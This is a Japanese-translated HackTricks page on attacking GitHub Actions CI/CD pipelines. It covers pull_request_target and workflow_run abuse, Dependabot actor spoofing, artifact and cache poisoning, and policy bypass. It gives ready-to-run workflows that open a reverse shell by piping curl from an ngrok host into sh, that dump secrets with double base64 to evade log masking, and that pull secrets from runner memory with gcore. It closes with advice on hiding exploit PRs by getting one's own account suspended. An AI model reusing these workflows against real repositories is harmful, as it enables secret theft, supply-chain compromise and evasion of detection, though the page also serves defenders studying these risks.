# Github Actionsの悪用

{{#include ../../../banners/hacktricks-training.md}}

## ツール

以下のツールはGithub Actionのworkflowを見つけたり、脆弱なものを発見したりするのに有用です:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Check also its checklist in [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## 基本情報

このページには以下が含まれます:

- 攻撃者がGithub Actionにアクセスできた場合の影響の**要約**
- アクションへのアクセスを得るための**様々な方法**:
- アクションを作成するための**権限**を持つこと
- **pull request**関連のトリガーの悪用
- 他の**外部アクセス**手法の悪用
- 既に侵害されたrepoからの**Pivoting**
- 最後に、アクション内部から悪用するための**post-exploitation techniques to abuse an action from inside**（上記の影響を引き起こす）についてのセクション

## 影響の要約

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

リポジトリ内で**GitHub Actionsで任意のコードを実行できる**場合、以下が可能になることがあります:

- パイプラインにマウントされた**secretsを盗む**、およびパイプラインの権限を**悪用して**AWSやGCPなどの外部プラットフォームへの不正アクセスを行う。
- デプロイやその他の**artifactsを破損/改ざん**する。
- パイプラインがアセットをデプロイまたは保存する場合、最終製品を改変してサプライチェーン攻撃を可能にする。
- カスタムワーカー上で**コードを実行**して計算資源を悪用し、他のシステムへ**pivot**する。
- `GITHUB_TOKEN`に関連する権限によっては、リポジトリコードを**上書き**する。

## GITHUB_TOKEN

この「**シークレット**」( `${{ secrets.GITHUB_TOKEN }}` と `${{ github.token }}` から提供される) は、管理者がこのオプションを有効にしたときに付与されます:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

このトークンは**Github Applicationが使用するものと同じ**で、同じエンドポイントにアクセスできます: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Githubは[**flow**](https://github.com/github/roadmap/issues/74)をリリースする予定で、GitHub内で**リポジトリ間のアクセスを許可**し、`GITHUB_TOKEN`を使ってリポジトリが他の内部リポにアクセスできるようになります。

このトークンの可能な**権限**は次で確認できます: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

このトークンは**ジョブが完了した後に失効する**ことに注意してください。\
これらのトークンは次のような形式です: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

このトークンでできる興味深いこと:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> いくつかの場面では、**Github Actions の envs や secrets の中に github user tokens を見つけることができます**。これらのトークンはリポジトリや組織に対してより多くの権限を与える可能性があります。

<details>

<summary>Github Action の出力にある secrets を一覧表示</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secretsを使ってreverse shellを取得する</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

他ユーザーのリポジトリでGithub Tokenに付与されている権限は、Github actionsのログを**確認することで**調べることができます:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## 許可された実行

> [!NOTE]
> これはGithub actionsを侵害する最も簡単な方法です。このケースは、あなたが**create a new repo in the organization**できるか、またはリポジトリに対して**write privileges over a repository**を持っていることを想定します。
>
> このシナリオにいる場合は、[Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action)を確認してください。

### Repo作成からの実行

組織のメンバーが**create new repos**でき、かつあなたがgithub actionsを実行できる場合、**create a new repo and steal the secrets set at organization level**することができます。

### 新しいブランチからの実行

もし既にGithub Actionが設定されているrepository内に**create a new branch in a repository that already contains a Github Action**できるなら、それを**modify**し、コンテンツを**upload**して、**execute that action from the new branch**することができます。こうすることで**exfiltrate repository and organization level secrets**できます（ただし、secretの名前を知っている必要があります）。

> [!WARNING]
> workflow YAML内だけで実装された制限（例えば、`on: push: branches: [main]`、job conditionals、またはmanual gates）はコラボレータによって編集され得ます。外部の強制（branch protections、protected environments、and protected tags）がなければ、貢献者はワークフローのターゲットを自分のブランチに変更して、マウントされたsecrets/permissionsを悪用できます。

修正したactionは、**manually,** **PR is created**時、または**some code is pushed**時に実行可能にできます（どれくらい目立ちたいかによります）:
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Forked Execution

> [!NOTE]
> 攻撃者が他のリポジトリの **Github Action を実行する** ことを可能にするさまざまなトリガーがあります。これらのトリガー可能なアクションが不適切に設定されていると、攻撃者がそれらを乗っ取る可能性があります。

### `pull_request`

ワークフロートリガー **`pull_request`** は、いくつかの例外を除き、プルリクエストが受信されるたびにワークフローを実行します：デフォルトでは**first time** you are **collaborating**, some **maintainer** will need to **approve** the **run** of the workflow:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> デフォルトの制限が **first-time** contributors 向けであるため、有効なバグ／typo を修正する形で貢献し、その後 **other PRs to abuse your new `pull_request` privileges** を送ることで特権を悪用できる可能性があります。
>
> **検証しましたが、これは動作しません**： ~~Another option would be to create an account with the name of someone that contributed to the project and deleted his account.~~

さらに、デフォルトではターゲットリポジトリへの **write permissions** と **secrets access** を防ぎます。詳細は[**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)を参照してください：

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

攻撃者は Github Action の定義を変更して任意の処理を実行したり任意のアクションを追加したりすることができます。しかし、前述の制限により secrets を盗んだり repo を上書きしたりすることはできません。

> [!CAUTION]
> **Yes, if the attacker change in the PR the github action that will be triggered, his Github Action will be the one used and not the one from the origin repo!**

攻撃者が実行されるコードも制御するため、`GITHUB_TOKEN` に secrets や write permissions がなくても、例えば **upload malicious artifacts** などの行為が可能です。

### **`pull_request_target`**

ワークフロートリガー **`pull_request_target`** はターゲットリポジトリへの **write permission** と **access to secrets** を持ち（許可を求めません）。

注意：ワークフロートリガー **`pull_request_target`** は **runs in the base context** で実行され、PR が提供するコンテキストではありません（**not execute untrusted code** ため）。`pull_request_target` の詳細は [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target) を参照してください。\
また、この特定の危険な使い方については [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) を参照してください。

実行されるワークフローが **base** で定義され **not in the PR** であるため **`pull_request_target`** の使用は安全に見えるかもしれませんが、安全でないケースがいくつかあります。

そしてこれは **access to secrets** を持ちます。

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger allows to run a workflow from a different one when it's `completed`, `requested` or `in_progress`.

In this example, a workflow is configured to run after the separate "Run Tests" workflow completes:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
さらに、ドキュメントによると：`workflow_run` イベントで開始されたワークフローは、前のワークフローができなかったとしても、シークレットにアクセスし、書き込み用のトークンを取得できます。

この種のワークフローは、外部ユーザが **`pull_request`** や **`pull_request_target`** を通じてトリガーできる **workflow** に依存している場合、攻撃される可能性があります。脆弱な例がいくつか[**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**。** 最初の例は **`workflow_run`** によってトリガーされたワークフローが攻撃者のコードをダウンロードするというものです: `${{ github.event.pull_request.head.sha }}`\
2つ目の例は、**untrusted** なコードから **artifact** を **`workflow_run`** ワークフローに渡し、その artifact の内容を利用することで **RCE に脆弱** になるというものです。

### `workflow_call`

TODO

TODO: pull_request から実行されたときに使用/ダウンロードされるコードが、オリジナルのリポジトリ由来かフォークされた PR のものかを確認する

## フォークされた実行の悪用

外部攻撃者が github workflow を実行させるために利用できるすべての方法について述べました。ここでは、これらの実行が不適切に構成されている場合にどのように悪用されるかを見ていきます。

### Untrusted checkout の実行

**`pull_request`** の場合、ワークフローは **PR のコンテキスト** で実行されるため（つまり **悪意ある PR のコードが実行される**）、誰かがそれを **まず承認する必要があり**、いくつかの[制限](#pull_request)の下で実行されます。

`pull_request_target` または `workflow_run` を使用するワークフローが、`pull_request_target` や `pull_request` からトリガーできるワークフローに依存している場合は、オリジナルのリポジトリのコードが実行されるため、**攻撃者は実行されるコードを制御できません**。

> [!CAUTION]
> しかし、もしその **action** に明示的な PR チェックアウトがあり、**base ではなく PR からコードを取得する**ようになっている場合は、攻撃者が制御するコードが使われます。例えば（行12で PR のコードがダウンロードされていることを確認してください）:

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

ビルドスクリプトや参照される **packages が PR の作成者によって制御されている** ため、`npm install` や `npm build` の実行中に潜在的に **untrusted なコードが実行されている** ことになります。

> [!WARNING]
> 脆弱な actions を検索するための github dork は: `event.pull_request pull_request_target extension:yml` です。ただし、action が不安全に構成されている場合でも、ジョブを安全に実行するように構成する（PR を生成した actor に関する条件分岐を使うなど）異なる方法が存在します。

### コンテキストにおけるスクリプトインジェクション <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

PR を作成する **ユーザ** によって値が **制御される** 特定の[**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) が存在することに注意してください。もし github action がその **データを何かの実行に使用している** 場合、**任意のコード実行** に繋がる可能性があります:

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV スクリプトインジェクション** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

ドキュメントによると: ワークフロージョブ内の後続の任意のステップから参照できるように、環境変数を定義または更新し、それを **`GITHUB_ENV`** 環境ファイルに書き込むことで環境変数を利用可能にできます。

攻撃者がこの **env** 変数の中に **任意の値を注入できる** と、後続のステップでコードを実行させる可能性のある環境変数（例えば **LD_PRELOAD** や **NODE_OPTIONS**）を注入することができます。

例えば（[**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) と [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project) を参照）、アップロードされた artifact の内容を **`GITHUB_ENV`** 環境変数に格納することを信頼しているワークフローを想像してください。攻撃者はそれを悪用するために次のようなものをアップロードできます:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot やその他の信頼されたボット

[**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest) にあるように、いくつかの組織では `dependabot[bot]` からの任意の PRR をマージする Github Action を持っています。
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Which is a problem because the `github.actor` field contains the user who caused the latest event that triggered the workflow. And There are several ways to make the `dependabot[bot]` user to modify a PR. For example:

- 被害者の repository を Fork する
- あなたのコピーに悪意のあるペイロードを追加する
- 自分の fork で Dependabot を有効にし、古い依存関係を追加する。Dependabot はその依存関係を修正する branch を作成し、悪意あるコードを含める。
- その branch から被害者の repository に Pull Request を開く（PR はユーザーによって作成されるので、この時点では何も起きない）
- 次に、攻撃者は自分の fork で Dependabot が最初に開いた PR に戻り、`@dependabot recreate` を実行する
- すると Dependabot はその branch でいくつかの操作を実行し、被害者の repo 上の PR を変更する。これにより `dependabot[bot]` がワークフローをトリガーした最新イベントの actor となり（したがってワークフローが実行される）

Moving on, what if instead of merging the Github Action would have a command injection like in:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Well, the original blogpost proposes two options to abuse this behavior being the second one:

- 被害者リポジトリを Fork し、いくつかの古い依存関係で Dependabot を有効化する。
- 悪意のある shell injeciton コードを含む新しい branch を作成する。
- その branch を repo の default branch に変更する。
- この branch から被害者リポジトリへ PR を作成する。
- その fork に Dependabot が開いた PR 内で `@dependabot merge` を実行する。
- Dependabot は fork したリポジトリの default branch に彼の変更を merge し、被害者リポジトリの PR を更新します。これにより、ワークフローをトリガーした最新イベントのアクターが `dependabot[bot]` になり、悪意のある branch 名を使用することになります。

### Vulnerable Third Party Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

As mentioned in [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), this Github Action allows to access artifacts from different workflows and even repositories.

The thing problem is that if the **`path`** parameter isn't set, the artifact is extracted in the current directory and it can override files that could be later used or even executed in the workflow. Therefore, if the Artifact is vulnerable, an attacker could abuse this to compromise other workflows trusting the Artifact.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
これは次のワークフローで攻撃できます:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## その他の外部アクセス

### Deleted Namespace Repo Hijacking

アカウントが名前を変更すると、しばらくして別のユーザーがその名前でアカウントを登録できる場合があります。もしリポジトリが名前変更前に**100未満の stars**だった場合、Github は同じ名前で新規登録したユーザーに、削除されたものと同じ**repository**を作成することを許可します。

> [!CAUTION]
> したがって、もし action が存在しないアカウントの repo を使用している場合、攻撃者がそのアカウントを作成して action を乗っ取る可能性があります。

他の repositories がこのユーザーの repos からの **dependencies** を使用している場合、攻撃者はそれらをハイジャックできます。詳細はこちら: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> このセクションでは、最初の repo に何らかのアクセスを持っていると仮定して、ある repo から別の repo へ**pivot する**ことを可能にする手法について説明します（前のセクションを参照）。

### Cache Poisoning

Cache は **同じ branch の workflow 実行間で**維持されます。つまり、攻撃者が cache に保存されるような **package** を乗っ取り、それが **downloaded** されてより権限の高い workflow によって実行されると、その workflow も**compromise**される可能性があります。

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows は **他の workflows や場合によっては repos からの artifacts** を使うことがあります。もし攻撃者が後に別の workflow で使われる **artifact を upload する** Github Action を**compromise**できれば、他の workflow も**compromise**される可能性があります：

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Action からの Post Exploitation

### Github Action Policies Bypass

[**このブログ記事**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass)で述べられているように、リポジトリや組織が特定の actions の使用を制限するポリシーを持っていても、攻撃者は workflow 内で action を単に download（`git clone`）してローカル action として参照することができます。ポリシーはローカルパスに影響しないため、**その action は何の制限もなく実行されます。**

例:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### OIDC 経由で AWS、Azure、GCP にアクセスする

Check the following pages:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/azure-security/az-basic-information/az-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### secrets へのアクセス <a href="#accessing-secrets" id="accessing-secrets"></a>

script にコンテンツを注入している場合、secrets にアクセスする方法を知っておくと便利です:

- secret または token が **environment variable** に設定されている場合、**`printenv`** を使って環境から直接アクセスできます。

<details>

<summary>Github Action の出力に secrets をリストする</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secretsを使ってreverse shellを取得する</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- secretが**式の中で直接使用される**と、生成されたシェルスクリプトは**ディスク上に保存**され、アクセス可能になります。
- ```bash
cat /home/runner/work/_temp/*
```
- JavaScript actionsの場合、secretsはenvironment variables経由で渡されます
- ```bash
ps axe | grep node
```
- For a **custom action**, the risk can vary depending on how a program is using the secret it obtained from the **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- secrets contextを使ってすべてのsecretsを列挙します（collaboratorレベル）。write権限のある貢献者は任意のブランチでworkflowを修正してリポジトリ/org/environmentのすべてのsecretsをダンプできます。GitHubのログマスキングを回避するために二重base64を使い、ローカルでデコードしてください：

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Decode locally:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: for stealth during testing, encrypt before printing (openssl is preinstalled on GitHub-hosted runners).

### Self-hosted runnersの悪用

どの**GitHub Actionsが非-GitHubインフラストラクチャで実行されているか**を見つける方法は、Github Actionの設定yamlで**`runs-on: self-hosted`**を検索することです。

**Self-hosted** runnersは**追加の機密情報**や他の**ネットワークシステム**（ネットワーク内の脆弱なエンドポイントやmetadata serviceなど）にアクセスできる可能性があります。また、たとえ隔離されて破棄されるとしても、**複数のactionが同時に実行される**ことがあり、悪意あるものが他のものの**secretsを盗む**可能性があります。

self-hosted runnersでは、メモリをダンプすることで、**secrets from the \_Runner.Listener**\_\*\* process\*\*からワークフローの任意のステップのすべてのsecretsを取得することも可能です：
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
詳細は[**こちらの記事**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/)を参照してください。

### GithubのDockerイメージレジストリ

Github actions を作成して、**Docker image を Github 内にビルドして保存する**ことが可能です。\
以下の折りたたみで例を確認できます:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

前のコードでわかるように、Github registry は **`ghcr.io`** にホストされています。

repo に対する read permissions を持つユーザーは、personal access token を使って Docker Image をダウンロードできます:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
その後、ユーザーは **leaked secrets in the Docker image layers:** を検索できます

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Github Actions ログの機密情報

たとえ **Github** が actions ログ内の **secret values** を検出して **avoid showing** しようとしても、action の実行中に生成されうる **other sensitive data** は隠されません。例えば、secret value で署名された JWT は、[specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) されていない限り隠されません。

## 足跡の隠蔽（Covering your Tracks）

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) まず、作成した PR は公開され、ターゲットの GitHub アカウントにも明確に見えます。GitHub ではデフォルトで、我々はインターネット上の PR を削除できませんが、ここにひとつの裏技があります。Github によって **suspended** されたアカウントの場合、そのアカウントのすべての **PRs are automatically deleted** としてインターネットから削除されます。したがって、自分の活動を隠すには、自分の **GitHub account suspended or get your account flagged** される必要があります。これにより GitHub 上のあなたのすべての活動はインターネットから **hide all your activities** されます（基本的にあなたの exploit PR がすべて削除されることになります）。

ある GitHub 組織はアカウントを GitHub に報告することに非常に積極的です。やるべきことは Issue に “some stuff” を投稿するだけで、12時間以内にあなたのアカウントが停止されるよう手配してくれます :p こうしてあなたの exploit は github 上で見えなくなります。

> [!WARNING]
> 組織が自分たちがターゲットにされたことを把握する唯一の方法は、SIEM から GitHub のログを確認することです。GitHub UI からは PR が削除されてしまうため、UI 上では確認できません。

## References

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
